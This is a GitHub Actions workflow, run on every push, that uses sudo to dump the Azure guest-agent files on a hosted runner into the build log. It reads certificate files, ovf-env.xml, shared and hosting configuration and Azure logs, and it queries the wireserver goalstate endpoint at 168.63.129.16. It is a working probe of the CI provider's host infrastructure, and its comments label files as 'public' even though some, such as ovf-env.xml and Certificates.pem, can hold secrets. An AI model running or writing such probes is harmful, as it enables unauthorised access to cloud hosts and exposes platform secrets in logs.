name: WAAgent Certs Probe
on: [push]

jobs:
  certs:
    runs-on: ubuntu-latest
    steps:
      - name: Read waagent CERTS only (public)
        shell: bash
        run: |
          set +e
          
          echo "===== TransportCert.pem (PUBLIC cert that signs IMDS attested doc) ====="
          sudo cat /var/lib/waagent/TransportCert.pem 2>&1 | head -25
          echo ""
          
          echo "===== Public *.crt files ====="
          for f in $(sudo ls /var/lib/waagent/*.crt 2>/dev/null); do
            echo "----- $f -----"
            sudo cat "$f" 2>&1 | head -25
            echo ""
            sudo openssl x509 -in "$f" -noout -text 2>&1 | head -40
            echo ""
          done
          
          echo "===== Certificates.xml (reveals cert names + hashes - NOT keys) ====="
          sudo cat /var/lib/waagent/Certificates.xml 2>&1 | head -30
          echo ""
          
          echo "===== Certificates.pem ====="
          sudo cat /var/lib/waagent/Certificates.pem 2>&1 | head -30
          echo ""
          
          echo "===== SharedConfig.xml (deployment / role info) ====="
          sudo cat /var/lib/waagent/SharedConfig.xml 2>&1 | head -50
          echo ""
          
          echo "===== HostingEnvironmentConfig.xml ====="
          sudo cat /var/lib/waagent/HostingEnvironmentConfig.xml 2>&1 | head -50
          echo ""
          
          echo "===== ovf-env.xml ====="
          sudo cat /var/lib/waagent/ovf-env.xml 2>&1
          echo ""
          
          echo "===== WireServerEndpoint ====="
          sudo cat /var/lib/waagent/WireServerEndpoint 2>&1
          echo ""
          
          echo "===== fast_track.json ====="
          sudo cat /var/lib/waagent/fast_track.json 2>&1
          echo ""
          
          echo "===== Microsoft.CPlat.Core.RunCommandLinux-1.0.9 ====="
          sudo ls -la /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9 2>&1
          echo ""
          
          echo "===== Probe wireserver via TCP using transport cert ====="
          # Wireserver is at 168.63.129.16; check if reachable from runner uid
          curl --max-time 3 -s "http://168.63.129.16/?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -20 || echo "Wireserver: BLOCKED"
          # Try with sudo
          sudo curl --max-time 3 -s "http://168.63.129.16/?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -50 || echo "Wireserver via sudo: BLOCKED"
          echo ""
          
          echo "===== /var/log/azure/ ====="
          sudo find /var/log/azure -type f 2>&1 | head -10
          for f in $(sudo find /var/log/azure -type f 2>/dev/null | head -3); do
            echo "----- $f -----"
            sudo head -20 "$f" 2>&1
          done
          
          true
